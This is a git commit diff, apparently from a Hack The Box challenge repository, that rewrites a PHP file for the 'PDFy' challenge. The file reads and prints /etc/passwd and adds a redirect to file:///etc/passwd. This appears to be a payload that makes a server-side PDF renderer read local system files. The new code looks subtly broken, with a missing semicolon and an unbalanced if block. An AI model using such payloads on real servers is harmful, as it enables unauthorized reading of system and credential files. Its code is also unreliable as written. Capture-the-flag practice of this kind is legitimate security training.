27cb9b2d65436b44976f48dbcb31b964a7f4b1cf
veritas <50308392+veritas-rt@users.noreply.github.com>
2024-05-26 14:46:19 +0900

    Add files via upload

--- HTB/HTB-PDFy.php
+++ HTB/HTB-PDFy.php
@@ -1,24 +1,15 @@
 <?php
-// ファイルパス
 $filename = '/etc/passwd';
-
-// ファイルが存在するかどうかを確認
 if (file_exists($filename)) {
-    // ファイルを読み取り専用で開く
     $file = fopen($filename, 'r');
-    
-    if ($file) {
-        // ファイル内容を読み取って表示
-        while (($line = fgets($file)) !== false) {
-            echo $line . "<br>";
-        }
 
-        // ファイルを閉じる
-        fclose($file);
-    } else {
-        echo "ファイルを開けませんでした。";
+    while (($line = fgets($file)) !== false) {
+        echo $line . "<br>";
     }
-} else {
-    echo "ファイルが存在しません。";
-}
+
+    // ファイルを閉じる
+    fclose($file);
+  
+    header("location:file:///etc/passwd")
+
 ?>
